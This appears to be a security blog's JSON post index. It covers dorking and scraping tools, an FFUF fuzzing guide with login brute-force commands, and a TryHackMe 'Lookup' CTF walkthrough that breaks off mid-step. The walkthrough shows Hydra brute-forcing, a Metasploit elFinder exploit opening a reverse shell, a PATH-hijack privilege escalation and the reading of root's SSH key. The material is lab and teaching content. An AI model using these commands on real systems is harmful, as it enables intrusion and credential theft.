[
  
  {
    "title": "Web: Cybersecurity Frameworks",
    "url": "/posts/web-cybersecurity-frameworks",
    "categories": "WebDev, Cybersecurity Frameworks",
    "tags": "WebDev, Cybersecurity Frameworks",
    "date": "2025-03-14 00:00:00 +0000",
    





    
    "snippet": "The frameworks presented here include Framework Hub (The Main Dashboard), OSINT Framework , Blue Team Framework , and Bug Bounty Framework . These frameworks are designed to help users find tools s...",
    "content": "The frameworks presented here include Framework Hub (The Main Dashboard), OSINT Framework , Blue Team Framework , and Bug Bounty Framework . These frameworks are designed to help users find tools specific to each area, such as Blue Team, Bug Bounty, and OSINT.Cybersecurity Frameworks Repositorys  Link: Framework Hub Repository  Link: OSINT Framework Repository  Link: Blue Team Framework Repository  Link: Bug Bounty Framework RepositoryOverview of the ProjectsShared TechnologiesMost of these projects leverage modern web development tools:  React: For building dynamic and interactive user interfaces.  TypeScript: To ensure type safety and improve maintainability.  Vite: For fast development and build processes.  CSS/Styled Components: For consistent and visually appealing designs.The Bug Bounty Framework stands out as it uses pure HTML and JavaScript, providing a lightweight terminal-based experience.Features Across ProjectsFramework Hub  A centralized dashboard offering access to multiple frameworks, including OSINT, Bug Bounty, Blue Team, and Google Dork tools.  Modular design allows users to switch between frameworks seamlessly.OSINT Framework  Unified search interface across multiple OSINT sources.  Categorized resources presented in a tree view for easy navigation.Blue Team Framework  Organized security tools grouped by categories like Network Discovery, Vulnerability Management, and Threat Intelligence.  Simulated security alerts and a cyberpunk-themed UI for an immersive experience.Bug Bounty Framework  Terminal-like environment with file system navigation and search functionality.  Dynamic animations like binary rain, Matrix effects, and cyber grids for an engaging experience.InterfaceFramework Hub: Centralized access to all frameworks.OSINT Framework: Tree view search and categorized resources.Blue Team Framework: Cyberpunk-themed UI with simulated alerts.Bug Bounty Framework: Terminal-like environment with animations.Ethical ConsiderationsEach project is designed with ethical use in mind:  Respect Privacy: Always ensure compliance with privacy laws and regulations.  Legal Compliance: Adhere to all applicable laws when conducting security research or bug hunting.  Responsible Disclosure: If vulnerabilities are discovered, follow responsible disclosure practices.  Defensive Use Only: Tools like the Blue Team Framework are for defense, not for unauthorized or malicious activities."
  },
  
  {
    "title": "Bug Bounty Tools Assistant",
    "url": "/posts/python-bug-bounty-tools-assistant",
    "categories": "Python, Bug Bounty Tools Assistant",
    "tags": "Python, Bug Bounty Tool",
    "date": "2025-03-01 00:00:00 +0000",
    





    
    "snippet": "A Python-based interactive CLI tool designed to assist bug bounty hunters and security testers by providing quick access to commands for Recon, Exploitation, and Miscellaneous tasks.Bug Bounty Tool...",
    "content": "A Python-based interactive CLI tool designed to assist bug bounty hunters and security testers by providing quick access to commands for Recon, Exploitation, and Miscellaneous tasks.Bug Bounty Tools Assistant Repository  Link: Bug Bounty Tools Assistant RepositoryFeatures  Interactive Menu: Navigate through categories like Recon, Exploitation, and Miscellaneous with ease.  Command Execution: Execute or simulate commands for tools like commix, nuclei, ffuf, and more.  Clipboard Support: Commands are copied to your clipboard for quick use.  Extensible: Easily add new tools or categories by modifying the code structure.  Rich Output: Clear and visually appealing output using the rich library.How It WorksThe Bug Bounty Tools Assistant is an interactive CLI tool that allows users to select from predefined categories (Recon, Exploitation, Miscellaneous) and tools within those categories. Once a tool is selected, the associated command is displayed, copied to the clipboard, and optionally executed. The tool supports both real execution and simulated execution for testing purposes.For example:  Run the program using python main.py.  Select a category (e.g., Recon).  Choose a tool (e.g., Subdomain Enumeration).  The tool’s command will be displayed, copied to your clipboard, and optionally executed.Code Structure  main.py: Entry point of the application. Displays the main menu and handles user interaction.  utils/menu.py: Contains functions for displaying the main menu and handling tool selection.  tools/: Directory containing modules for different categories (recon.py, exploitation.py, miscellaneous.py).  execute_command.py: Handles the execution or simulation of commands.  LICENSE: License file for the project.InterfaceFuture Enhancements  Add support for additional tools and categories.  Introduce a web-based GUI for easier accessibility.  Implement automated updates for tool commands and configurations.  Add integration with APIs for real-time vulnerability scanning.Ethical ConsiderationsThis tool is intended for educational and ethical purposes only. Users are responsible for ensuring they have proper authorization before using this tool on any system or network. Unauthorized use of this tool may violate laws and regulations. Always follow ethical guidelines and respect privacy when conducting security tests."
  },
  
  {
    "title": "Deep Dork",
    "url": "/posts/python-deep-dork",
    "categories": "Python, Deep Dork",
    "tags": "Python, Deep Dork",
    "date": "2025-02-27 00:00:00 +0000",
    





    
    "snippet": "Deep Dork is an advanced Google Dorking tool designed to automate and streamline the process of discovering sensitive information exposed on the web. It leverages Google’s search engine, proxies, C...",
    "content": "Deep Dork is an advanced Google Dorking tool designed to automate and streamline the process of discovering sensitive information exposed on the web. It leverages Google’s search engine, proxies, CAPTCHA bypass mechanisms, and result parsing to provide a powerful utility for ethical security research and reconnaissance.In addition to the Python CLI version, Deep Dork Web is now available as a browser-based tool, offering an intuitive interface for performing advanced Google Dork searches without requiring local setup or dependencies. The web version supports real-time search filtering, dynamic query generation, and seamless integration with search engines like Google, making it accessible to users of all skill levels.Deep Dork Repository  CLI Version: Deep Dork Repository  Web Version: Deep Dork WebFeatures  Advanced Search with Google Dorks: Use predefined or custom Google Dork queries to uncover specific types of data, such as exposed files, directories, or vulnerable endpoints.  Proxy Support: Configure and validate HTTP, SOCKS4, and SOCKS5 proxies to anonymize requests and avoid IP blocking.  CAPTCHA Handling: Built-in mechanisms to bypass CAPTCHAs using Selenium headless browsing or third-party CAPTCHA-solving services.  Multi-threaded Proxy Validation: Efficiently test and validate large proxy lists in parallel to ensure reliability.  Search History &amp; Export: Maintain a history of searches and export results in JSON or CSV format for further analysis.  Customizable Dork Templates: Load predefined Dork templates from a JSON file or create your own for tailored searches.  Interactive Menu System (CLI): A user-friendly command-line interface for seamless navigation and operation.  Real-Time Search Filtering (Web): Dynamically filter dorks based on search terms and categories in the browser-based version.  Dynamic Query Generation (Web): Replace placeholders in dork queries with user-provided input for personalized searches.  Search Engine Integration (Web): Generate direct links to Google search results for selected dorks.How It Works  Query Construction: The tool allows users to input a domain, name, or other target-specific keywords. These are combined with predefined or custom Google Dork templates to form search queries.  Search Execution: The tool sends requests to Google’s search engine using randomized User-Agent headers and optional proxies to avoid detection and blocking.  Result Parsing: The HTML response from Google is parsed using BeautifulSoup to extract relevant details like titles, URLs, and snippets.  CAPTCHA Bypass: If a CAPTCHA is encountered, the tool can either use Selenium to simulate browser behavior or delegate solving to a third-party service like 2Captcha.  Proxy Management: Proxies are tested for validity and performance before being used. The tool rotates through available proxies to distribute requests evenly.  Output &amp; Export: Results are displayed in the CLI or web interface and can be saved to a file in JSON or CSV format for offline analysis.For the web version, users simply visit the hosted URL, enter their search terms, and click on generated links to view results directly in their browser.Code StructureThe project is organized into two main classes:  GoogleDorkSearch:          Handles the core functionality of constructing queries, sending requests, parsing results, and managing proxies.      Includes methods for testing proxies, bypassing CAPTCHAs, and parsing search results.        DorkMenu:          Provides an interactive menu system for users to configure proxies, run searches, view history, and export results.      Manages search history persistence and integrates with GoogleDorkSearch for executing operations.      Key Modules:  requests and BeautifulSoup: For sending HTTP requests and parsing HTML responses.  selenium: For CAPTCHA bypass using headless Chrome.  fake_useragent: To generate random User-Agent strings for request headers.  threading: For concurrent proxy validation and testing.  json and csv: For saving and exporting search results and history.For the web version, the tool uses:  HTML/CSS/JavaScript: For the responsive and modern user interface.  fetch API: To load predefined dorks from a JSON file dynamically.  Dynamic Link Generation: To integrate seamlessly with search engines like Google.InterfaceCLI VersionThe tool provides an intuitive CLI-based interface with the following options:  Advanced Search: Run custom or predefined Google Dork queries.  Run All Dorks Automatically: Iterate through a list of predefined Dork templates and execute them sequentially.  Configure Proxies: Add proxies manually or load them from a file, with automatic validation.  View History: Display past searches and their results.  Export Results: Save search results to a file in JSON or CSV format.  Test Proxies: Validate the configured proxies to ensure they are functional.  Solve CAPTCHA: Use a third-party CAPTCHA-solving service to handle blocked requests.  Exit: Save the search history and exit the program.Web VersionThe web interface includes:  Search Bar: Enter keywords or phrases to filter dorks dynamically.  Category Filter: Narrow down results by selecting specific categories.  Real-Time Results: View matching dorks with their queries, categories, and descriptions.  Direct Links: Click on generated links to open search results in Google or other supported search engines.  Responsive Design: Accessible and functional on both desktop and mobile devices.Limitations  Rate Limiting: Google may impose rate limits or block IPs despite using proxies, requiring careful configuration.  CAPTCHA Dependency: CAPTCHA bypass mechanisms may fail if Google implements stricter anti-bot measures.  Ethical Constraints: The tool should only be used for authorized security assessments. Misuse can lead to legal consequences.  Proxy Reliability: The effectiveness of the tool depends on the quality and availability of proxies.Future Enhancements  Enhanced CAPTCHA Handling: Integrate additional CAPTCHA-solving services or machine learning models for improved accuracy.  GUI Implementation: Develop a graphical user interface (GUI) for broader accessibility.  API Integration: Provide an API endpoint for integrating the tool into larger security workflows.  Support for Other Search Engines: Extend functionality to include Bing, DuckDuckGo, and other search engines.  Automated Report Generation: Generate detailed reports with insights and recommendations based on search results.Ethical ConsiderationsThis tool is intended for ethical use only, such as penetration testing, vulnerability assessments, and security research. Unauthorized use of this tool to access or exploit sensitive information is strictly prohibited and may violate laws and regulations. Always ensure you have explicit permission before conducting any reconnaissance or scanning activities.By using this tool, you agree to abide by all applicable laws and ethical guidelines. The developers and contributors of this project are not responsible for any misuse or illegal activities carried out with this software."
  },
  
  {
    "title": "Github Scraper",
    "url": "/posts/python-github-scraper",
    "categories": "Python, Github Scraper",
    "tags": "Python, Github Scraper",
    "date": "2025-02-25 00:00:00 +0000",
    





    
    "snippet": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter re...",
    "content": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter repositories by programming language, associated tools/technologies (e.g., Docker, React, TensorFlow), and star ratings.  Date Filtering: Retrieve repositories updated within a specific time range (e.g., last 6 months, 1 year).  Rate Limit Handling: Automatically handles GitHub API rate limits to ensure uninterrupted scraping.  CLI and GUI Interfaces: Offers both command-line and graphical user interfaces for flexibility.  Metadata Extraction: Fetches repository metadata, including the latest commit date, owner details, and more.  Retry Mechanism: Implements retry logic for failed API requests, ensuring robustness.How It WorksThe GitHub Scanner uses the GitHub REST API to query repositories based on user-defined parameters. Here’s a step-by-step breakdown of its operation:  Input Parameters: The user specifies search criteria such as programming language, tools, star range, and date range.  API Requests: The tool sends requests to the GitHub API to fetch matching repositories.  Data Processing: Extracts relevant metadata, such as repository name, owner, latest commit date, and star count.  Output: Displays the results in a structured format (e.g., CLI output or GUI table).The scraper also includes a retry mechanism to handle rate limits and transient errors gracefully.Code StructureThe codebase is organized into modular components for maintainability and scalability:  API Interaction:          make_api_request: Handles API calls with retry logic and rate limit management.      check_rate_limit: Fetches and displays the current rate limit status.        Search Functions:          search_repositories: Queries GitHub for repositories based on search criteria.      get_repository_metadata: Retrieves detailed metadata for a specific repository.        Utility Functions:          is_within_date_range: Filters repositories based on the latest commit date.      get_latest_commit_date: Fetches the most recent commit date for a repository.        User Interface:          CLI: Provides a text-based interface for input and output.      GUI: Offers a graphical interface for ease of use.      InterfaceCLI VersionThe CLI version provides a straightforward, text-based interface for users who prefer simplicity and speed. Below is an example of the CLI interface:GUI VersionThe GUI version offers a more interactive experience with dropdown menus, checkboxes, and visual feedback. Users can select programming languages, filter by tools/technologies, specify star ranges, and set date filters through intuitive controls. A progress bar provides real-time updates during the scraping process, while a log area displays clickable links to the discovered repositories.Here’s a preview of the GUI interface:Creating a GitHub TokenTo use the GitHub Scanner, you need to generate a personal access token:  Go to your GitHub Account Settings.  Navigate to Developer Settings → Personal Access Tokens → Tokens (classic).  Click Generate New Token and select Generate New Token (classic).  Select the necessary scopes (e.g., repo, read:org).  Copy the generated token and paste it into the script where indicated (YOUR_GITHUB_TOKEN_HERE).Limitations  Rate Limits: GitHub imposes strict rate limits on unauthenticated and authenticated API requests. While the scraper handles these limits, excessive queries may still lead to temporary blocks.  Search Complexity: Complex queries with multiple filters may take longer to process due to API constraints.  Data Completeness: The scraper relies on GitHub’s API, which may not expose all repository details.Future Enhancements  Advanced Filters: Add support for filtering by license type, repository size, or contributor count.  Export Options: Allow users to export results in various formats (e.g., CSV, JSON, Excel).  Parallel Processing: Implement multi-threading to speed up large-scale queries.  Web Interface: Develop a web-based dashboard for remote access and collaboration.  Machine Learning Integration: Use ML models to recommend repositories based on user preferences.Ethical Considerations  Respect Rate Limits: Always adhere to GitHub’s API usage policies to avoid overloading their servers.  Data Privacy: Ensure that scraped data is used responsibly and does not violate any privacy agreements.  Attribution: Properly credit repository owners when using their data for research or analysis.Tips and Tricks  Optimize Queries: Use specific keywords and filters to narrow down results and reduce API calls.  Monitor Rate Limits: Regularly check your rate limit status to avoid unexpected interruptions.  Use Tokens Wisely: Authenticate with a personal access token to increase your rate limit allowance.  Batch Processing: For large datasets, consider breaking queries into smaller batches to stay within rate limits.Extra Insights  The scraper supports multiple programming languages and tools, making it versatile for various use cases.  By analyzing the latest commit dates, users can identify actively maintained repositories.  Combining star ratings with other filters helps prioritize high-quality projects."
  },
  
  {
    "title": "Cross Site Scripting (XSS)",
    "url": "/posts/bug-bounty/xss",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, XSS, Vulnerabilities",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "SQL Injection",
    "url": "/posts/bug-bounty/sql-injection",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, SQL, Vulnerabilities",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "FFUF: Fuzzing Guide to Web Applications",
    "url": "/posts/ffuf-Fuzzing-Guide",
    "categories": "Tools, FFUF Fuzzing Guide",
    "tags": "Tools, FFUF",
    "date": "2025-02-15 00:00:00 +0000",
    





    
    "snippet": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuz...",
    "content": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuzzing. This guide will provide an in-depth explanation of FFUF commands, their use cases, and advanced techniques to help you leverage its full potential.Table of Contents  Installation  Basic Commands  Advanced Features  Output Options  Custom WordlistsInstallationTo install FFUF on your system, follow the instructions below:Debian/Ubuntu Based Systemssudo apt update &amp;&amp; sudo apt install ffufmacOS (Using Homebrew)brew install ffufOther Operating SystemsFor other operating systems, download the binary from the official GitHub repository:GitHub - ffuf: Fast web fuzzer written in GoOnce downloaded, extract the binary and add it to your system’s PATH.Basic CommandsDirectory and File Brute ForceOne of the most common uses of FFUF is finding hidden directories and files on a web server. Use the -u flag to specify the target URL and the -w flag to provide a wordlist.ffuf -u https://example.com/FUZZ -w wordlist.txtExplanation:  FUZZ: A placeholder that FFUF replaces with words from the wordlist.  wordlist.txt: A text file containing potential directory or file names.POST Request with WordlistTo fuzz POST requests, use the -X POST flag.ffuf -w wordlist.txt -u https://website.com/FUZZ -X POSTThis command sends POST requests while fuzzing the URL path.Case Insensitive MatchingUse the -ic flag for case-insensitive matching, which is useful when unsure about server case sensitivity.ffuf -u https://example.com/FUZZ -w wordlist.txt -ic -cThe -c flag adds color-coded output for better readability.File Extension FuzzingTo search for files with specific extensions, use the -e flag.ffuf -u https://example.com/indexFUZZ -w wordlist.txt -e .php,.asp,.bak,.dbThis command appends extensions like .php, .asp, .bak, and .db to each word in the wordlist.Recursive FuzzingFor multi-level directory fuzzing, use the -recursion flag.ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3This scans up to three levels deep, helping uncover deeply nested directories.Advanced FeaturesFiltering ResponsesFilter responses based on HTTP status codes or response sizes.ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404,500This excludes responses with status codes 404 or 500.Multi Wordlist FuzzingFuzz multiple parameters using separate wordlists.ffuf -u https://example.com/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2Here, W1 and W2 are placeholders replaced by words from dict.txt and dns_dict.txt, respectively.Subdomain and Virtual Host FuzzingSubdomain FuzzingDiscover hidden subdomains by replacing the FUZZ keyword in the target URL.ffuf -w subdomains.txt -u https://FUZZ.example.com/Virtual Host (VHost) FuzzingFuzz the Host header to detect virtual hosts.ffuf -w vhosts.txt -u https://example.com/ -H \"Host: FUZZ.example.com\"Fuzzing HTTP ParametersGET Parameter FuzzingFind potential GET parameters by fuzzing the query string.ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=valuePOST Parameter FuzzingTest APIs or login forms by fuzzing POST data.ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'Login Bypass TestingBrute force login systems by fuzzing the password parameter.ffuf -w passwordlist.txt -X POST -d \"username=admin&amp;password=FUZZ\" -u https://www.example.com/loginPUT Request FuzzingTest unauthorized file uploads or modifications.ffuf -w /path/to/wordlist.txt -X PUT -u https://target.com/FUZZ -b 'session=abcdef'Advanced FFUF TechniquesClusterbomb ModeCombine multiple wordlists for comprehensive testing.ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZThis tests every combination of usernames and passwords.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode clusterbombPitchfork ModePair corresponding entries from two wordlists for controlled brute force testing.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode pitchforkSetting CookiesInclude cookies in your requests for authenticated fuzzing.ffuf -b \"SESSIONID=abcd1234; USER=admin\" -w wordlist.txt -u https://example.com/FUZZUsing ProxiesRoute FFUF requests through a proxy like Burp Suite for deeper analysis.ffuf -x http://127.0.0.1:8080 -w wordlist.txt -u https://example.com/FUZZCustom Header FuzzingFuzz custom headers to identify vulnerabilities.ffuf -w headers.txt -u https://example.com/ -H \"X-Custom-Header: FUZZ\"Fuzzing with Custom User-AgentModify the User-Agent header to mimic specific browsers.ffuf -u \"https://example.com/FUZZ\" -w wordlist.txt -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"Rate Limiting BypassControl the request rate to avoid triggering rate limiting defenses.ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 50 -t 50Output OptionsSave results in various formats for further analysis.HTML Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.html -of htmlJSON Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of jsonCSV Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.csv -of csvSave all output formats at once:ffuf -w wordlist.txt -u https://example.com/FUZZ -o results -of allCustom Wordlists with PayloadsAccess the wordlists with payloads here:  SecLists  PayloadsAllTheThings and PayloadsAllTheThings Website  PayloadBox"
  },
  
  {
    "title": "Browser Extensions for Cybersecurity",
    "url": "/posts/browser-extensions-cybersecurity",
    "categories": "Tools, Browser Extensions",
    "tags": "Tools, Browser Extensions",
    "date": "2025-02-13 00:00:00 +0000",
    





    
    "snippet": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gath...",
    "content": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gathering intelligence, and improving your workflow. From detecting exposed credentials to managing proxies and analyzing metadata.Reconnaissance &amp; Information Gathering1. Wappalyzer — Technology DetectorWhy It’s Useful: Identifies the technology stack of websites, including frameworks, CMS, and server details.Link: Wappalyzer - Chrome Web Store2. Shodan — Website Intelligence ToolWhy It’s Useful: Provides information on website hosting, server locations, and open ports.Link: Shodan - Chrome Web Store3. Mitaka — OSINT Search ToolWhy It’s Useful: Searches IPs, domains, URLs, and hashes across multiple threat intelligence platforms.Link: Mitaka - Chrome Web Store4. Vortimo OSINT ToolWhy It’s Useful: A versatile tool for bookmarking, scraping, and analyzing web pages during OSINT investigations.Link: Vortimo OSINT Tool - Chrome Web Store5. Hunter.io — Finding Emails on WebsitesWhy It’s Useful: Extracts publicly available emails from websites for security reporting and OSINT investigations.Link: Hunter - Chrome Web Store6. WaybackURL — Fetch Archived URLsWhy It’s Useful: Retrieves all URLs from the Wayback Machine to identify past versions of web pages.Link: Wayback Machine - Chrome Web Store7. Traduzir Paginas Web — Webpage TranslatorWhy It’s Useful: Translates entire web pages into different languages for analyzing foreign websites.Link: Google Translate - Chrome Web Store8. EXIF Viewer Pro — Extract Image MetadataWhy It’s Useful: Retrieves metadata from images directly on a webpage for forensic analysis and OSINT investigations.Link: EXIF Viewer Pro - Chrome Web StoreTesting &amp; Exploitation9. HackTools — Payload GeneratorWhy It’s Useful: Provides pre-built payloads for SQLi, XSS, and other attacks to save time during manual testing.Link: Hack-Tools - Chrome Web Store10. EditThisCookie — Advanced Cookie EditorWhy It’s Useful: Allows modification, deletion, and analysis of cookies, including checking HTTPOnly and Secure flags.Link: EditThisCookie - Chrome Web Store11. D3coder — Encode/Decode ToolWhy It’s Useful: Encodes and decodes various text formats like Base64, URL encoding, and Unix timestamps.Link: D3coder - Chrome Web Store12. EndPointer — Find Sensitive URLsWhy It’s Useful: Extracts and analyzes URLs for potential security endpoints during penetration testing.Link: EndPointer - Chrome Web Store13. Link Gopher — Extract All LinksWhy It’s Useful: Fetches all links from a webpage for reconnaissance purposes.Link: Link Gopher - Chrome Web Store14. FindSomething — Hidden Parameter FinderWhy It’s Useful: Scans source code and JavaScript files for interesting patterns and hidden data, such as API keys.Link: FindSomething - Chrome Web Store15. .git Finder — Information DisclosureWhy It’s Useful: Detects exposed .git directories that may lead to source code leaks.Link: .git Finder - Chrome Web Store16. S3BucketList — AWS Bucket FinderWhy It’s Useful: Searches for publicly accessible AWS S3 buckets to detect misconfigured cloud storage.Link: S3BucketList - Chrome Web StoreAutomation &amp; Efficiency17. FoxyProxy — Proxy Management for Burp SuiteWhy It’s Useful: Simplifies proxy management for intercepting web traffic with tools like Burp Suite or OWASP ZAP.Link: FoxyProxy - Chrome Web Store18. Open Multiple URLs — Bulk URL OpenerWhy It’s Useful: Opens multiple links simultaneously, saving time during bug hunting.Link: Open Multiple URLs - Chrome Web Store19. YesWeHack VDP FinderWhy It’s Useful: Detects vulnerability disclosure programs (VDP) of visited websites for responsible reporting.Link: YesWeHack VDP Finder - Chrome Web Store20. SponsorBlock — Skip YouTube SponsorsWhy It’s Useful: Skips sponsored segments, intros, and outros on YouTube videos to save time.Link: SponsorBlock - Chrome Web StorePrivacy &amp; Security21. uBlock Origin — Ad and Tracker BlockerWhy It’s Useful: Blocks ads, trackers, and malicious scripts to improve privacy and security.Link: uBlock Origin - Chrome Web Store22. WebRTC Protect — Protect IP LeakWhy It’s Useful: Disables WebRTC to prevent IP address leakage, ensuring anonymity while browsing.Link: WebRTC Protect - Chrome Web Store23. Temp-Mail — Disposable Email ServiceWhy It’s Useful: Provides temporary email addresses to avoid spam and protect your personal information.Link: Temp Mail - Chrome Web Store24. Dark Reader — Eye ProtectionWhy It’s Useful: Provides a dark mode for all websites to reduce eye strain during late-night sessions.Link: Dark Reader - Chrome Web Store"
  },
  
  {
    "title": "THM: Lookup",
    "url": "/posts/ctf-redteam-lookup",
    "categories": "CTF, Red Team",
    "tags": "CTF, Red Team",
    "date": "2025-02-12 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover hidden resources.  Hydra: For brute-forcing login credentials.  Metasploit: For exploiting the elFinder command injection vulnerability.  Python: For spawning an interactive shell.  Linpeas: For automating enumeration and identifying privilege escalation vectors.Resources Used:  Lookup: TryHackMe  GTFOBins: A repository of Unix binaries that can be exploited for privilege escalation.  SecLists: A collection of wordlists used for brute-forcing credentials with Hydra.  Exploit DB: An alternative resource for finding exploits, such as the one used for elFinder.Step 1: Scanning the Target NetworkWe begin by scanning the target machine 10.10.41.18 using Nmap to identify open ports and services.Command:nmap 10.10.41.18 -sV -sCOutput:Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 ISTNmap scan report for lookup.thm (10.10.41.18)Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Observations:  Port 22 (SSH): Running OpenSSH 8.2p1.  Port 80 (HTTP): Running Apache HTTP Server 2.4.41.Step 2: Discovering Subdomains with GobusterTo find any hidden subdomains or directories, we use Gobuster:Command:gobuster dns -d lookup.thm -w /usr/share/wordlists/dirb/common.txtOutput:===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     lookup.thm[+] Method:                  DNS[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Timeout:                 10s===============================================================2025/01/05 18:00:00 Starting gobuster in DNS subdomain enumeration mode===============================================================files.lookup.thm (Status: FOUND)...Key Concept:  Gobuster: A tool for discovering subdomains, directories, and files on a web server. In this case, we used it to uncover the files.lookup.thm subdomain.Step 3: Adding Target to Hosts FileFor easier navigation, we add the target’s IP to the /etc/hosts file.Commands:echo \"10.10.41.18 lookup.thm\" | sudo tee -a /etc/hostsecho \"10.10.41.18 files.lookup.thm\" | sudo tee -a /etc/hostsStep 4: Navigating to the Web ApplicationAfter updating the hosts file, we open the web application in a browser. The login page appears.Attempting Default Credentials:We attempt to log in with common default credentials but are met with a “wrong password” message and a 3-second delay before redirection.Key Concept:  Brute Force Protection: The delay is likely implemented to prevent brute-force attacks.Step 5: Brute Forcing Login Using HydraSince default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.Command:hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=try again\"Output:[80][http-post-form] host: lookup.thm   login: jose   password: password123Key Concept:  Hydra: A powerful tool for brute-forcing login forms. It automates the process of trying multiple username-password combinations.Step 6: Logging InUsing the discovered credentials (jose:password123), we log into the system. After logging in, we are redirected to the files.lookup.thm domain.Step 7: Exploring the credential.txt FileUpon opening the credential.txt file, we find some credentials that might be for SSH. However, attempting to use these credentials fails:Command:ssh think@10.10.41.18Output:think@10.10.41.18's password:Permission denied, please try again.Step 8: Identifying VulnerabilitiesWhile interacting with the system, we discover a vulnerable web application called elFinder running on the target machine.Version Discovery:By inspecting the web interface, we determine the version of elFinder (2.1.47).Searching for Exploits:We search for exploits related to this version in Metasploit and Exploit DB:Commands:msfconsole -qsearch elfinder 2.1.47Output:Matching Modules================    #  Name                                                               Disclosure Date  Rank       Check  Description   -  ----                                                                ---------------  ----       -----  -----------   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command InjectionKey Concept:  Metasploit: A framework for developing and executing exploit code against remote targets.  Exploit DB: A database of public exploits and shellcode. You could have searched for the vulnerability here as well.Step 9: Exploiting the elFinder VulnerabilityWe select and configure the exploit module for elFinder:Commands:use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injectionset LHOST tun0set RHOST files.lookup.thmrunOutput:[*] Started reverse TCP handler on 10.17.14.127:4444 [*] Uploading payload 'TRNyzgLuCE.jpg;echo ...' (1975 bytes)[*] Triggering vulnerability via image rotation ...[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...[*] Sending stage (40004 bytes) to 10.10.41.18[+] Deleted .7mrFCOx.php[*] Meterpreter session 1 opened (10.17.14.127:4444 -&gt; 10.10.41.18:35566)Key Concept:  Command Injection: The vulnerability allows us to inject commands into the application, which are then executed by the server.Step 10: Spawning a ShellOnce inside the system, we have a limited shell as the www-data user. To make it more interactive, we spawn a proper shell using Python:Command:python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Key Concept:  PTY Shell: A pseudo-terminal provides a fully interactive shell, allowing us to execute complex commands and navigate the system effectively.At this point, we could have used linpeas to automate the enumeration process and check for every privilege escalation possibility:Steps:  Upload linpeas.sh to the target machine.  Execute it with the following command:    ./linpeas.sh        Linpeas would have highlighted potential privilege escalation vectors, such as misconfigured SUID binaries or weak file permissions.Step 11: Privilege EscalationAs the www-data user, we check for potential privilege escalation opportunities.Checking SUID Binaries:We search for binaries with the SUID bit set:Command:find / -perm /4000 2&gt;/dev/nullOutput:/usr/sbin/pwmKey Concept:  SUID Bit: Files with the SUID bit set allow users to execute them with the file owner’s privileges.Exploiting the pwm Binary:We manipulate the PATH variable to exploit the pwm binary:Commands:export PATH=/tmp:$PATHecho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' &gt; /tmp/idchmod +x /tmp/id/usr/sbin/pwmThis changes the user to think.Step 12: SSH Brute-ForcingWe perform an SSH brute-force attack using Hydra to gain access as the think user:Command:hydra -l think -P wordlist.txt ssh://lookup.thmOutput:think:josemario.AKA(think)Logging In:ssh think@lookup.thmRetrieving User Flag:cat /home/think/user.txt{REDACTED}Step 13: Privilege Escalation to RootAs the think user, we check for sudo privileges:Command:sudo -lOutput:User think may run the following commands on lookup:(ALL) /usr/bin/lookExploiting the look Command:Using GTFOBins, we find a method to read sensitive files with the look command:Command:LFILE=/root/.ssh/id_rsasudo look '' \"$LFILE\"This grants us the root user’s private SSH key.Logging In 